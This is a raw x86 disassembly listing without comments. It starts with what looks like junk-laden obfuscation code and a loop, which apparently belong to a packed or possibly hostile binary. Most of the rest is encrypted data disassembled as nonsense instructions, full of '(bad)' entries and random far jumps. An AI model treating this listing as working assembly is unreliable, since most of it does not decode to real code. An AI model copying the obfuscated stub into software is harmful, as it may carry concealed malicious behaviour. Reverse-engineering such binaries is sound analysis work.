  40fcd0:	xor    edx,DWORD PTR ds:0x428e81
  40fcd6:	dec    edx
  40fcd7:	mov    DWORD PTR ds:0x428e81,edx
  40fcdd:	mov    edx,DWORD PTR ds:0x428e81
  40fce3:	dec    edx
  40fce4:	mov    DWORD PTR ds:0x428e81,edx
  40fcea:	jmp    0x40fc94
  40fcef:	mov    edx,DWORD PTR [ebp+0x8]
  40fcf2:	adc    ebx,0x7b56
  40fcf8:	mov    ebx,DWORD PTR [ebp-0x58]
  40fcfb:	sub    DWORD PTR ds:0x428ea9,0xceb
  40fd05:	lea    edx,[ebx+edx*1+0x5708f8]
  40fd0c:	mov    DWORD PTR ds:0x428e91,0x63b8
  40fd16:	mov    DWORD PTR [ebp-0x58],edx
  40fd19:	mov    edx,DWORD PTR [ebp+0x8]
  40fd1c:	mov    ebx,DWORD PTR [ebp-0x54]
  40fd1f:	add    edx,0x64f89a
  40fd25:	adc    DWORD PTR ds:0x428e6d,0x428e79
  40fd2f:	imul   edx,ebx
  40fd32:	mov    DWORD PTR [ebp-0x54],edx
  40fd35:	xor    ebx,edx
  40fd37:	mov    edx,DWORD PTR [ebp+0x8]
  40fd3a:	xor    DWORD PTR ds:0x428e75,0x629e
  40fd44:	mov    ebx,DWORD PTR [ebp-0x50]
  40fd47:	mov    DWORD PTR ds:0x428ea5,0x655f
  40fd51:	add    edx,0x242ebed
  40fd57:	mov    DWORD PTR ds:0x428e49,0x3be8
  40fd61:	and    edx,ebx
  40fd63:	and    DWORD PTR ds:0x428e5d,0x0
  40fd6d:	jmp    0x40fd7f
  40fd72:	mov    ebx,DWORD PTR ds:0x428e5d
  40fd78:	inc    ebx
  40fd79:	mov    DWORD PTR ds:0x428e5d,ebx
  40fd7f:	cmp    DWORD PTR ds:0x428e5d,0x1e
  40fd86:	jae    0x412148
  40fd8c:	cmp    DWORD PTR ds:0x428e5d,0x8
  40fd93:	ja     0x412148
  40fd99:	jmp    0x40fdae
  40fd9e:	push   0x4280dc
  40fda3:	push   0x2c09
  40fda8:	call   DWORD PTR ds:0x42ca20
  40fdae:	cmp    DWORD PTR ds:0x428e5d,0x7
  40fdb5:	jne    0x40fdca
  40fdbb:	xor    ebx,ebx
  40fdbd:	xor    ebx,DWORD PTR ds:0x428e5d
  40fdc3:	inc    ebx
  40fdc4:	mov    DWORD PTR ds:0x428e5d,ebx
  40fdca:	jmp    0x40fd72
  40fdcf:	jmp    0x412148
  40fdd4:	xadd   edi,edi
  40fdd7:	dec    ebx
  40fdd8:	push   ecx
  40fdd9:	dec    ebp
  40fdda:	dec    edi
  40fddb:	sar    eax,0xe5
  40fdde:	mov    al,ah
  40fde0:	(bad)  
  40fde1:	fild   DWORD PTR [edx-0x17]
  40fde4:	mov    dl,0x4f
  40fde6:	jnp    0x40fe63
  40fde8:	xlat   BYTE PTR ds:[ebx]
  40fde9:	sahf   
  40fdea:	jnp    0x40fe67
  40fdec:	sbb    bl,bh
  40fdee:	les    ebp,FWORD PTR [eax-0x4f]
  40fdf1:	loop   0x40fe19
  40fdf3:	xchg   edi,eax
  40fdf4:	(bad)  
  40fdf5:	cmc    
  40fdf6:	xchg   ebp,eax
  40fdf7:	xor    al,0x3
  40fdf9:	stc    
  40fdfa:	mov    eax,ds:0xb4a7eea8
  40fdff:	adc    BYTE PTR [ebx+0x342f66c6],cl
  40fe05:	stos   BYTE PTR es:[edi],al
  40fe06:	neg    DWORD PTR [esi-0x8]
  40fe09:	jmp    0x17d6:0xe256cd2b
  40fe10:	push   es
  40fe11:	fisubr DWORD PTR [esi-0xb]
  40fe14:	outs   dx,DWORD PTR ds:[esi]
  40fe15:	sbb    eax,0xac4a700b
  40fe1a:	es push 0xfde2431d
  40fe20:	test   BYTE PTR [edx-0x26b657ff],ah
  40fe26:	test   BYTE PTR ds:[ecx-0x6f],ch
  40fe2a:	sti    
  40fe2b:	mov    edx,0x37f2249a
  40fe30:	shr    DWORD PTR [ebp+0x58601100],1
  40fe36:	sub    bl,BYTE PTR [edi+0x7c9edfb4]
  40fe3c:	ret    0xce0b
  40fe3f:	sti    
  40fe40:	cs hlt 
  40fe42:	fimul  DWORD PTR [esp+esi*4]
  40fe45:	cmp    eax,DWORD PTR [edx-0x30725ab8]
  40fe4b:	mov    es,WORD PTR [ebp+0x7f912386]
  40fe51:	(bad)  
  40fe52:	pop    ss
  40fe53:	cs and al,0x98
  40fe56:	cmp    bl,ah
  40fe58:	or     dh,al
  40fe5a:	dec    edi
  40fe5b:	(bad)  
  40fe5c:	mov    cl,0xa1
  40fe5e:	icebp  
  40fe5f:	fwait
  40fe60:	jge    0x40fe3c
  40fe62:	mov    DWORD PTR [edx+0x41b85bba],ebp
  40fe68:	enter  0xb1ac,0xab
  40fe6c:	(bad)  
  40fe6d:	into   
  40fe6e:	cmc    
  40fe6f:	imul   ebx,DWORD PTR [ecx+0x7ef0437],0x25
  40fe76:	jecxz  0x40fe56
  40fe78:	jo     0x40fef0
  40fe7a:	fcom   QWORD PTR [edi-0x16205b47]
  40fe80:	sbb    DWORD PTR [ebp+0x44],edi
  40fe83:	xor    eax,edi
  40fe85:	outs   dx,BYTE PTR ds:[esi]
  40fe86:	cmp    cl,bl
  40fe88:	jns    0x40fe36
  40fe8a:	xor    ah,ah
  40fe8c:	clc    
  40fe8d:	or     cl,BYTE PTR [ebp-0x5b9f770c]
  40fe93:	sbb    BYTE PTR [esi+ecx*1],al
  40fe96:	jge    0x40fe37
  40fe98:	fisttp WORD PTR [edi+0x635f715b]
  40fe9e:	add    dl,BYTE PTR [ebx-0x4ba8cfcf]
  40fea4:	dec    eax
  40fea5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fea6:	fs and eax,0xebb41876
  40feac:	pop    eax
  40fead:	arpl   WORD PTR ds:0xaaa65874,di
  40feb3:	mov    esp,0xcc887191
  40feb8:	js     0x40fecf
  40feba:	mov    WORD PTR [ecx+0xe],cs
  40febd:	sub    eax,DWORD PTR [ecx-0x444de140]
  40fec3:	(bad)  
  40fec4:	scas   al,BYTE PTR es:[edi]
  40fec5:	popf   
  40fec6:	push   edi
  40fec7:	sbb    ebx,edx
  40fec9:	jo     0x40fef7
  40fecb:	add    al,0xd4
  40fecd:	jne    0x40fe7b
  40fecf:	add    al,0x28
  40fed1:	push   es
  40fed2:	out    dx,eax
  40fed3:	jae    0x40ff13
  40fed5:	test   ch,bh
  40fed7:	push   edi
  40fed8:	retf   0xa918
  40fedb:	dec    eax
  40fedc:	out    0xdc,al
  40fede:	cs into 
  40fee0:	cmp    BYTE PTR [ecx+0x5e],0x62
  40fee4:	sub    bl,0x3e
  40fee7:	push   ecx
  40fee8:	sub    ah,BYTE PTR [si+0x50d8]
  40feed:	pushf  
  40feee:	mov    al,fs:0xa1f1344a
  40fef4:	scas   al,BYTE PTR es:[edi]
  40fef5:	mov    DWORD PTR [ebx-0x5361c717],eax
  40fefb:	and    DWORD PTR [edi],eax
  40fefd:	test   al,0x87
  40feff:	push   ebp
  40ff00:	dec    ebp
  40ff01:	xor    DWORD PTR [edx-0x69],esi
  40ff04:	push   ds
  40ff05:	push   cs
  40ff06:	in     al,dx
  40ff07:	icebp  
  40ff08:	xor    al,0x5b
  40ff0a:	mov    edi,0x514a0197
  40ff0f:	and    eax,DWORD PTR [ebx]
  40ff11:	mov    edx,0xdc06e026
  40ff16:	in     al,dx
  40ff17:	lds    eax,FWORD PTR [ebp-0x5afc0513]
  40ff1d:	and    BYTE PTR [eax-0x7d],bl
  40ff20:	xor    esi,DWORD PTR [esp+edi*1]
  40ff23:	jne    0x40ff81
  40ff25:	and    BYTE PTR [ecx],dl
  40ff27:	ror    BYTE PTR [eax+0x54],cl
  40ff2a:	setb   BYTE PTR [edi-0x72]
  40ff2e:	inc    ebx
  40ff2f:	inc    edx
  40ff30:	out    dx,al
  40ff31:	mov    WORD PTR [ecx+0x76],?
  40ff34:	out    0xa7,eax
  40ff36:	dec    esp
  40ff37:	retf   
  40ff38:	into   
  40ff39:	pop    esp
  40ff3a:	out    0x56,eax
  40ff3c:	mov    ds:0x1b7d585f,eax
  40ff41:	inc    ebx
  40ff42:	pop    ebx
  40ff43:	jb     0x40fec6
  40ff45:	dec    esi
  40ff46:	xor    DWORD PTR [esi-0x3aff2dd2],edx
  40ff4c:	ins    DWORD PTR es:[edi],dx
  40ff4d:	mov    esp,0x9fa2b5a0
  40ff52:	push   ss
  40ff53:	xlat   BYTE PTR es:[ebx]
  40ff55:	mov    ebx,DWORD PTR [eax+edi*1+0x7f]
  40ff59:	sti    
  40ff5a:	sbb    cl,cl
  40ff5c:	pop    esi
  40ff5d:	inc    eax
  40ff5e:	cwde   
  40ff5f:	nop
  40ff60:	je     0x40ff7b
  40ff62:	and    ebx,ecx
  40ff64:	lahf   
  40ff65:	test   BYTE PTR [edi+0x60],0x62
  40ff69:	fs paddsw mm4,QWORD PTR fs:[edi]
  40ff6e:	into   
  40ff6f:	sbb    eax,DWORD PTR [ebx+0x55]
  40ff72:	pusha  
  40ff73:	jmp    0xdaf5:0xb025de6e
  40ff7a:	mov    edi,ecx
  40ff7c:	xlat   BYTE PTR ds:[ebx]
  40ff7d:	retf   
  40ff7e:	adc    edx,DWORD PTR [ebx]
  40ff80:	cmp    BYTE PTR [eax-0x79],ah
  40ff83:	push   edi
  40ff84:	sub    dl,0xd1
  40ff87:	xor    ch,BYTE PTR [eax+0x61]
  40ff8a:	adc    eax,0xe6bf9f4e
  40ff8f:	dec    eax
  40ff90:	or     ecx,DWORD PTR [ecx+0x56]
  40ff93:	sahf   
  40ff94:	ins    BYTE PTR es:[edi],dx
  40ff95:	in     eax,0x8c
  40ff97:	pop    esp
  40ff98:	cmc    
  40ff99:	mov    ds:0x6cafc715,al
  40ff9e:	dec    ebx
  40ff9f:	(bad)  
  40ffa0:	fcomp  DWORD PTR [edx-0x73]
  40ffa3:	mov    ebp,0x9adecde3
  40ffa8:	je     0x40ff55
  40ffaa:	std    
  40ffab:	add    al,0x2c
  40ffad:	push   ebx
  40ffae:	cmp    BYTE PTR [eax+0x7f],al
  40ffb1:	mov    edx,0x8327ddf5
  40ffb6:	jo     0x40ffbf
  40ffb8:	clc    
  40ffb9:	inc    edi
  40ffba:	fmul   QWORD PTR [edi+0x3d]
  40ffbd:	iret   
  40ffbe:	hlt    
  40ffbf:	dec    esi
  40ffc0:	adc    DWORD PTR [ebx+edi*8-0x3cf9f9a9],esp
  40ffc7:	test   DWORD PTR [eax-0x31322ebe],ebx
  40ffcd:	mov    edx,0x386aeccf
  40ffd2:	mov    BYTE PTR [ebx],0xc3
  40ffd5:	adc    al,0xcb
  40ffd7:	dec    ecx
  40ffd8:	or     DWORD PTR [edx+0x669a2354],esp
  40ffde:	inc    ecx
  40ffdf:	mov    dl,0x12
  40ffe1:	mov    ds:0xa06cf91a,eax
  40ffe6:	les    edx,FWORD PTR [eax+edx*1+0x66a0aa9a]
  40ffed:	add    al,0x1b
  40ffef:	test   DWORD PTR [edx+0x14],ebp
  40fff2:	in     eax,0xdc
  40fff4:	pop    es
  40fff5:	outs   dx,DWORD PTR ds:[esi]
  40fff6:	enter  0xf121,0xff
  40fffa:	inc    esp
  40fffb:	mov    eax,0x9edad31a
  410000:	stos   BYTE PTR es:[edi],al
  410001:	iret   
  410002:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410003:	xchg   ebx,eax
  410004:	nop
  410005:	pusha  
  410006:	push   esp
  410007:	jne    0x40ff9e
  410009:	(bad)  
  41000a:	sti    
  41000b:	js     0x410021
  41000d:	fidiv  WORD PTR [edx+0x61]
  410010:	dec    esi
  410011:	loopne 0x410003
  410013:	jl     0x40ffa7
  410015:	push   esp
  410016:	adc    al,0x31
  410018:	jl     0x410092
  41001a:	mov    ah,0x6b
  41001c:	aas    
  41001d:	sbb    al,BYTE PTR [ebp-0xd56f3c4]
  410023:	mov    edx,0x766b258f
  410028:	sub    DWORD PTR [edi-0x47efa95a],0x79
  41002f:	jl     0x41004b
  410031:	xor    DWORD PTR [eax+0x37d33d39],0x5b226053
  41003b:	or     ch,BYTE PTR ds:0x1f9bfa18
  410041:	iret   
  410042:	xchg   esp,eax
  410043:	jmp    0xe0cb406d
  410048:	push   ebx
  410049:	rcl    esp,1
  41004b:	pop    edi
  41004c:	mov    DWORD PTR [esp+ecx*8+0x14],esi
  410050:	mov    ch,0xdc
  410052:	loopne 0x4100c3
  410054:	xor    edi,DWORD PTR [ebp-0xac551f6]
  41005a:	mov    eax,0xd0fe3360
  41005f:	das    
  410060:	test   al,0x2f
  410062:	cld    
  410063:	jbe    0x410028
  410065:	adc    edx,edi
  410067:	stos   BYTE PTR es:[edi],al
  410068:	addr16 popa 
  41006a:	mov    cl,0x58
  41006c:	xchg   ecx,eax
  41006d:	aam    0xdc
  41006f:	into   
  410070:	ja     0x40fff6
  410072:	jne    0x410063
  410074:	inc    ebx
  410075:	push   DWORD PTR [ecx+0x59fad14d]
  41007b:	mov    ah,0x4c
  41007e:	imul   DWORD PTR [ecx]
  410080:	jbe    0x41004d
  410082:	iret   
  410083:	cld    
  410084:	mov    WORD PTR [ebx-0x5e24cfb4],?
  41008a:	mov    BYTE PTR [ebx-0x29],ch
  41008d:	into   
  41008e:	stc    
  41008f:	mov    al,ds:0x6c598cb3
  410094:	push   0x3f
  410096:	mov    dl,BYTE PTR [ecx+0x5bc0cf02]
  41009c:	add    BYTE PTR [ebx],ah
  41009e:	dec    ebx
  41009f:	aaa    
  4100a0:	int    0x60
  4100a2:	jp     0x4100f6
  4100a4:	mov    cl,0xf5
  4100a6:	push   ebx
  4100a7:	outs   dx,BYTE PTR ds:[esi]
  4100a8:	xchg   ecx,eax
  4100a9:	stos   BYTE PTR es:[edi],al
  4100aa:	pop    esp
  4100ab:	mov    ah,0xb9
  4100ad:	mov    bl,0x9b
  4100af:	sbb    edx,DWORD PTR [esp+eiz*2+0x1da4acf6]
  4100b6:	shr    DWORD PTR [esp+edi*8+0x1ad442bf],0x6a
  4100be:	dec    BYTE PTR [edi]
  4100c0:	mov    BYTE PTR [ebx-0x31],dh
  4100c3:	out    dx,al
  4100c4:	mov    al,ds:0x6d8e2e2f
  4100c9:	inc    eax
  4100ca:	fld    TBYTE PTR [ecx+0x47]
  4100cd:	adc    al,0x89
  4100cf:	loope  0x4100fb
  4100d1:	mov    cs,WORD PTR [edx]
  4100d3:	daa    
  4100d4:	popf   
  4100d5:	outs   dx,BYTE PTR ds:[esi]
  4100d6:	xchg   edi,eax
  4100d7:	cmp    bh,0x1c
  4100da:	aam    0xfa
  4100dc:	jns    0x410085
  4100de:	lea    ecx,[ebx+0x21]
  4100e1:	and    ch,0x4a
  4100e4:	and    ebx,ebp
  4100e6:	pusha  
  4100e7:	lock clc 
  4100e9:	or     eax,0x9fdad1fc
  4100ee:	mov    cl,0xe2
  4100f0:	retf   
  4100f1:	lock pop es
  4100f3:	cmp    al,BYTE PTR [ebp+0x72]
  4100f6:	jnp    0x41013a
  4100f8:	dec    edx
  4100f9:	shr    BYTE PTR [edi-0x71],cl
  4100fc:	shl    edi,0xc
  4100ff:	push   ebx
  410100:	mov    bl,0x36
  410102:	jae    0x4100b9
  410104:	sub    eax,0x575aeea3
  410109:	jns    0x41013c
  41010b:	xlat   BYTE PTR ds:[ebx]
  41010c:	jae    0x41013e
  41010e:	fcomp  DWORD PTR [ecx]
  410110:	mov    eax,ds:0xf762f4b0
  410115:	daa    
  410116:	ja     0x41017b
  410118:	push   ecx
  410119:	fnstcw WORD PTR [esi+0x7b11f17c]
  41011f:	push   esp
  410120:	add    ecx,DWORD PTR [ebp+0x71]
  410123:	push   esp
  410124:	jle    0x4100e2
  410126:	icebp  
  410127:	xchg   BYTE PTR [edi],ch
  410129:	sar    DWORD PTR [ebx-0x6],1
  41012c:	fimul  WORD PTR [eax+ebx*2]
  41012f:	xor    al,0xe2
  410131:	jmp    0x410133
  410133:	push   esp
  410134:	(bad)  
  410135:	xchg   ecx,eax
  410136:	mov    ah,0x59
  410139:	cmp    eax,0x10d0254f
  41013e:	mov    DWORD PTR [edi],ebp
  410140:	je     0x410140
  410142:	ins    DWORD PTR es:[edi],dx
  410143:	lahf   
  410144:	ret    0x8901
  410147:	ins    DWORD PTR es:[edi],dx
  410148:	jge    0x41010f
  41014a:	push   es
  41014b:	popa   
  41014c:	pop    ss
  41014d:	jae    0x410172
  41014f:	mov    al,ds:0xe1c61d78
  410154:	mov    ds:0x10cd754e,al
  410159:	mov    DWORD PTR [edx+0x2272c22a],esi
  41015f:	pop    ds
  410160:	inc    esi
  410161:	push   ss
  410162:	pop    eax
  410163:	iret   
  410164:	dec    ebx
  410165:	fwait
  410166:	dec    edi
  410167:	push   edi
  410168:	cmp    eax,0x9d30be13
  41016d:	je     0x4101c0
  41016f:	cmp    esp,edi
  410171:	and    bl,ah
  410173:	add    edi,DWORD PTR [edx]
  410175:	dec    ecx
  410176:	les    esi,FWORD PTR ds:0xc719b762
  41017c:	add    dl,cl
  41017e:	cs push esp
  410180:	fmul   QWORD PTR [ecx]
  410182:	pop    edx
  410183:	pop    ss
  410184:	sbb    bh,0x97
  410187:	into   
  410188:	mov    cl,0x4d
  41018a:	add    al,0xc9
  41018c:	mov    ebx,0xbccf8768
  410191:	aaa    
  410192:	jno    0x410184
  410194:	cmp    BYTE PTR [edi+0x15],dl
  410197:	jns    0x410212
  410199:	add    eax,ebx
  41019b:	cmp    al,0x98
  41019d:	or     DWORD PTR [eax],0xf5b24371
  4101a3:	jae    0x4101a7
  4101a5:	sub    al,0x29
  4101a7:	stos   BYTE PTR es:[edi],al
  4101a8:	mov    ebx,0x27d0c76c
  4101ad:	push   es
  4101ae:	adc    DWORD PTR [ecx+0x120bb613],0xdf7e6eb3
  4101b8:	xchg   ebx,eax
  4101b9:	inc    ebx
  4101ba:	pop    eax
  4101bb:	dec    eax
  4101bc:	cdq    
  4101bd:	bound  eax,QWORD PTR [esi-0xcdb32d0]
  4101c3:	sahf   
  4101c4:	jne    0x4101b8
  4101c6:	adc    esp,eax
  4101c8:	std    
  4101c9:	fsub   DWORD PTR [edx+0x3efa6f19]
  4101cf:	es stos DWORD PTR es:[edi],eax
  4101d1:	cdq    
  4101d2:	ins    BYTE PTR es:[edi],dx
  4101d3:	test   BYTE PTR [ecx+esi*1+0x7e],dh
  4101d7:	cmp    BYTE PTR [ecx-0x44e358fc],dl
  4101dd:	into   
  4101de:	adc    esp,DWORD PTR [ebx]
  4101e0:	clc    
  4101e1:	xchg   ecx,eax
  4101e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4101e3:	add    DWORD PTR [esi+0x28],esp
  4101e6:	in     eax,0xd0
  4101e8:	push   0x38
  4101ea:	push   cs
  4101eb:	clc    
  4101ec:	add    eax,0x43375633
  4101f1:	scas   eax,DWORD PTR es:[edi]
  4101f2:	mov    edx,0x96e6a1c4
  4101f7:	in     al,0x47
  4101f9:	sbb    BYTE PTR [ecx+0x6a],ah
  4101fc:	ss adc al,0x36
  4101ff:	pop    ebx
  410200:	and    DWORD PTR [ecx+0x45f81014],edx
  410206:	jbe    0x410219
  410208:	lock arpl WORD PTR [eax-0x2ea778a0],ax
  41020f:	pop    eax
  410210:	jl     0x4101ca
  410212:	or     eax,0xbb230a32
  410217:	sar    bl,cl
  410219:	add    eax,0xa541cc9d
  41021e:	std    
  41021f:	(bad)  
  410220:	fisub  WORD PTR [edi+0x3e]
  410223:	xchg   ebx,eax
  410224:	sub    ecx,DWORD PTR [esi]
  410226:	push   edi
  410227:	out    0x88,al
  410229:	xlat   BYTE PTR ds:[ebx]
  41022a:	xor    BYTE PTR ds:0x6f89c00f,al
  410230:	retf   
  410231:	sub    DWORD PTR [esi],ebx
  410233:	jnp    0x410240
  410235:	cs js  0x410204
  410238:	or     cl,BYTE PTR [ebp-0x40cdc387]
  41023e:	lea    edx,[ebx]
  410240:	dec    edx
  410241:	mov    ebp,0x204f14ab
  410246:	jns    0x41029f
  410248:	hlt    
  410249:	add    cl,al
  41024b:	loopne 0x4102cc
  41024d:	push   esi
  41024e:	data16 int3 
  410250:	les    ecx,FWORD PTR [ebx+0x6c77c086]
  410256:	mov    ah,0xa7
  410258:	inc    ebp
  410259:	imul   edx,edx,0xffffffec
  41025c:	xchg   edx,eax
  41025d:	int    0x87
  41025f:	outs   dx,DWORD PTR ds:[esi]
  410260:	add    eax,0xc35c9ba5
  410265:	scas   eax,DWORD PTR es:[edi]
  410266:	xor    al,0xf9
  410268:	mov    al,0xc0
  41026a:	xor    al,0x1c
  41026c:	test   bl,dl
  41026e:	leave  
  41026f:	ret    0x352a
  410272:	(bad)
  410276:	fmul   st(4),st
  410278:	dec    esp
  410279:	aaa    
  41027a:	xchg   edx,eax
  41027b:	mov    dl,0x1f
  41027d:	sbb    DWORD PTR [ecx-0x42],ebp
  410280:	and    cl,bh
  410282:	imul   edx,DWORD PTR [ebx],0x33
  410285:	jnp    0x410229
  410287:	cmp    ch,dl
  410289:	dec    esi
  41028a:	dec    esi
  41028b:	xor    al,BYTE PTR [edi-0x6b]
  41028e:	mov    ecx,DWORD PTR [ebp+0x4]
  410291:	lds    ebp,FWORD PTR [ebx-0x69]
  410294:	sub    BYTE PTR [ebp+0x42],bl
  410297:	push   edi
  410298:	je     0x41024b
  41029a:	icebp  
  41029b:	add    DWORD PTR [eax+0x6bbc1279],ebx
  4102a1:	jnp    0x410310
  4102a3:	xor    BYTE PTR [edx],dl
  4102a5:	cdq    
  4102a6:	ret    0x3a76
  4102a9:	or     DWORD PTR [ebx],eax
  4102ab:	add    ch,cl
  4102ad:	pop    ebx
  4102ae:	repz push cs
  4102b0:	cli    
  4102b1:	or     BYTE PTR gs:[esi-0x7122bcca],ah
  4102b8:	ins    DWORD PTR es:[edi],dx
  4102b9:	aaa    
  4102ba:	jg     0x4102be
  4102bc:	pop    ds
  4102bd:	ja     0x410321
  4102bf:	and    ch,BYTE PTR [ecx+0x3f7b5ec2]
  4102c5:	sub    al,0x3b
  4102c7:	nop
  4102c8:	dec    edx
  4102c9:	repnz inc eax
  4102cb:	adc    edi,DWORD PTR ss:[eax-0x79eab42]
  4102d2:	test   eax,0xda417377
  4102d7:	in     eax,dx
  4102d8:	inc    esi
  4102d9:	adc    al,0xfa
  4102db:	gs rcl bh,1
  4102de:	inc    esp
  4102df:	iret   
  4102e0:	or     DWORD PTR [edi-0x10],ebx
  4102e3:	push   es
  4102e4:	jns    0x410276
  4102e6:	push   edx
  4102e7:	xchg   ebx,eax
  4102e8:	add    bh,BYTE PTR [edi+0x4a49d5fb]
  4102ee:	dec    ebx
  4102ef:	sbb    al,0x93
  4102f1:	jecxz  0x410283
  4102f3:	sti    
  4102f4:	inc    ecx
  4102f5:	jmp    0x2578:0xa8e0dcc3
  4102fc:	lahf   
  4102fd:	outs   dx,DWORD PTR ds:[esi]
  4102fe:	stos   DWORD PTR es:[edi],eax
  4102ff:	mov    cl,cl
  410301:	mov    al,BYTE PTR [eax+0x4ab88415]
  410307:	inc    eax
  410308:	fisttp WORD PTR [edi]
  41030a:	retf   
  41030b:	and    DWORD PTR ds:0x51cbfe11,esi
  410311:	les    ebx,FWORD PTR [ebp+0x79cd4de6]
  410317:	mov    WORD PTR [edx+0x13],fs
  41031a:	(bad)  
  41031b:	or     al,0x34
  41031d:	push   cs
  41031e:	push   ss
  41031f:	cmp    eax,0x1f309e36
  410324:	adc    bh,bl
  410326:	outs   dx,BYTE PTR ds:[esi]
  410327:	addr16 add ch,0x1f
  41032b:	cmc    
  41032c:	xchg   BYTE PTR [esi-0x5e6f4792],bh
  410332:	xchg   edx,eax
  410333:	xor    ah,0x19
  410336:	sub    bl,BYTE PTR ss:[edx+0x3e78f806]
  41033d:	push   edx
  41033e:	iret   
  41033f:	jb     0x4103b9
  410341:	mov    ebx,0xc3fbbd29
  410346:	test   BYTE PTR [ebp-0x19d00901],0xa4
  41034d:	mov    ds:0x16bc0ca7,eax
  410352:	pusha  
  410353:	xor    al,0xb7
  410355:	(bad)  
  410356:	jl     0x410365
  410358:	imul   BYTE PTR [esi]
  41035a:	mov    bh,0xc5
  41035c:	fldenv [eax+eax*4+0x73ba7109]
  410363:	fwait
  410364:	pop    es
  410365:	imul   esi,DWORD PTR [eax+0x3c1dd9f0],0xb776a21e
  41036f:	icebp  
  410370:	ins    DWORD PTR es:[edi],dx
  410371:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410372:	cmp    BYTE PTR [bx+di],0x3c
  410376:	fmul   st(7),st
  410378:	jge    0x410310
  41037a:	and    dl,BYTE PTR [eax]
  41037c:	sbb    BYTE PTR [ecx+ecx*2],ah
  41037f:	push   cs
  410380:	(bad)  
  410381:	pop    ds
  410382:	and    eax,0x274ba5cf
  410387:	mov    eax,0x64542836
  41038c:	push   eax
  41038d:	adc    al,0xb0
  41038f:	ins    BYTE PTR es:[edi],dx
  410390:	or     eax,0x3937eb81
  410395:	mov    bl,0x8f
  410397:	mov    esi,DWORD PTR [edx-0x49b9062b]
  41039d:	push   ecx
  41039e:	lahf   
  41039f:	sar    BYTE PTR [ecx],1
  4103a1:	lock icebp 
  4103a3:	nop
  4103a4:	inc    ecx
  4103a5:	popf   
  4103a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4103a7:	cmp    BYTE PTR [esi+0x32],0x55
  4103ab:	cld    
  4103ac:	test   eax,0xea86a4b9
  4103b1:	jnp    0x4103ff
  4103b3:	aam    0x74
  4103b5:	and    BYTE PTR [ebx+edx*2],ch
  4103b8:	into   
  4103b9:	fcmove st,st(7)
  4103bb:	xchg   edx,eax
  4103bc:	xor    BYTE PTR [ebx],dh
  4103be:	add    bh,BYTE PTR [esi+0x6a5ac73f]
  4103c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4103c5:	cmp    DWORD PTR [esi+0x63],esp
  4103c8:	(bad)  
  4103c9:	nop
  4103ca:	shl    DWORD PTR [ecx-0x4159f9ce],1
  4103d0:	daa    
  4103d1:	push   edi
  4103d2:	xchg   ebp,eax
  4103d3:	or     edi,0xfffffffd
  4103d6:	sbb    BYTE PTR ds:0x443e48b5,0x3a
  4103dd:	xor    bh,bl
  4103df:	inc    ebp
  4103e0:	retf   0xf0ef
  4103e3:	daa    
  4103e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4103e5:	popf   
  4103e6:	mov    ebp,?
  4103e8:	mov    esp,0x46d70335
  4103ed:	sbb    DWORD PTR [edx+0x1d],esp
  4103f0:	mov    ebx,0x9b8bd515
  4103f5:	push   ebx
  4103f6:	ins    DWORD PTR es:[edi],dx
  4103f7:	addr16 sub edi,edx
  4103fa:	inc    ebp
  4103fb:	mov    esi,0xbd8f7c75
  410400:	cld    
  410401:	xchg   esi,eax
  410402:	xchg   esi,eax
  410403:	sbb    BYTE PTR ds:0xaf0b31e1,dl
  410409:	hlt    
  41040a:	out    dx,al
  41040b:	ins    DWORD PTR es:[edi],dx
  41040c:	push   edx
  41040d:	test   DWORD PTR [esi+edx*8+0x11],eax
  410411:	jns    0x41047c
  410413:	addr16 push esi
  410415:	hlt    
  410416:	lea    edx,[edx+0x25]
  410419:	cmp    dl,BYTE PTR [ecx-0x2d]
  41041c:	ja     0x4103f5
  41041e:	jo     0x41042c
  410420:	imul   ebx,DWORD PTR [ecx-0x76],0x3f
  410424:	xor    eax,0xeb363a82
  410429:	in     al,dx
  41042a:	mov    DWORD PTR [edx+ecx*4+0x55],edx
  41042e:	fisttp WORD PTR [esi+0x2d]
  410431:	ja     0x4103f2
  410433:	(bad)  
  410434:	cmc    
  410435:	test   DWORD PTR [ecx+0x7d],esi
  410438:	xchg   ebx,eax
  410439:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41043a:	or     al,0x2f
  41043c:	bound  esi,QWORD PTR [edx+0x2654895]
  410442:	jge    0x4104aa
  410444:	popf   
  410445:	or     dl,BYTE PTR [edi-0x348ed578]
  41044b:	cdq    
  41044c:	or     DWORD PTR [ebx-0x39],edi
  41044f:	sub    DWORD PTR [edi+0x63e57bd6],ebp
  410455:	pop    ecx
  410456:	jo     0x4103df
  410458:	sub    esp,edx
  41045a:	loope  0x4103dd
  41045c:	pop    ss
  41045d:	ret    
  41045e:	lods   eax,DWORD PTR ds:[esi]
  41045f:	sub    BYTE PTR [esi],dh
  410461:	arpl   bx,si
  410463:	int    0x56
  410465:	ss or  cl,ah
  410468:	mov    eax,fs
  41046a:	cmp    eax,0x315be240
  41046f:	pusha  
  410470:	cmp    eax,0xf44ac2f1
  410475:	add    BYTE PTR [edi+0x74d957f7],cl
  41047b:	dec    ebp
  41047c:	je     0x410459
  41047e:	pop    ss
  41047f:	pop    ds
  410480:	xchg   edi,eax
  410481:	jle    0x4104d2
  410483:	call   0x403d5f28
  410488:	mov    ds:0xaad25b46,eax
  41048d:	cmp    al,0x14
  41048f:	jno    0x4104a2
  410491:	push   eax
  410492:	popf   
  410493:	test   WORD PTR ds:0x2f18526f,0x89c4
  41049c:	pop    ebx
  41049d:	mov    bl,0x5a
  41049f:	mov    WORD PTR [edi+0x67],?
  4104a2:	(bad)  
  4104a3:	fs mov dh,0xf0
  4104a6:	test   BYTE PTR [ebp-0x4c],dh
  4104a9:	nop    DWORD PTR ds:0x73e398df
  4104b0:	fsubr  DWORD PTR [eax+0x546d4490]
  4104b6:	test   BYTE PTR [esi],ah
  4104b8:	clc    
  4104b9:	sbb    esi,ecx
  4104bb:	cmp    DWORD PTR [edi-0x26],ebx
  4104be:	jbe    0x41044e
  4104c0:	xchg   BYTE PTR [esi],bl
  4104c2:	hlt    
  4104c3:	pop    DWORD PTR [ebp-0x18]
  4104c6:	in     eax,dx
